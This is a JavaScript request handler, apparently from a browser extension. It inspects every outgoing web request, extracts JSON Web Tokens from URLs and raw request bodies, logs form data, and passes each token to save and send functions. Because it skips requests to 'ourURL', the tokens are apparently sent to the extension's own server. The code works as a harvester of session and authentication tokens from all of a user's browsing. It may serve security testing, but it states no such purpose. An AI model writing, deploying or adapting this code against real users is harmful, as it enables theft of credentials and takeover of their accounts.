import { save, send, ourURL } from './utilities'
import { JWT, findJWT } from './jwt'


const processRequest = (req, match) => {
    const data = JWT(match, { url: req.url, type: 'R', name: req.type })
    console.log('JWT FOUND', data)
    save(data)
    send(data)
}

const decodeRaw = (raw) => {
    return raw.map(data => {
        return decodeURIComponent(String.fromCharCode.apply(null, new Uint8Array(data.bytes)));
    }).join('')
}


const onBeforeRequestHandler = req => {
    if (ourURL(req.url)) {
        return
    }
    if (req.method === 'POST') {
        console.debug("POST sent")
    }
    const urlMatches = findJWT(req.url)
    for (const match of urlMatches) {
        processRequest(req, match)
    }
    if (req.requestBody?.formData) {
        console.log(req.url, " formData: ", req.requestBody.formData)
        console.log(req.url, " raw: ", decodeRaw(req.requestBody?.raw))
    }
    if (req.requestBody?.raw) {
        const rawMatches = findJWT(decodeRaw(req.requestBody.raw))
        for (const match of rawMatches) {
            processRequest(req, match)
        }
    }
}

export default onBeforeRequestHandler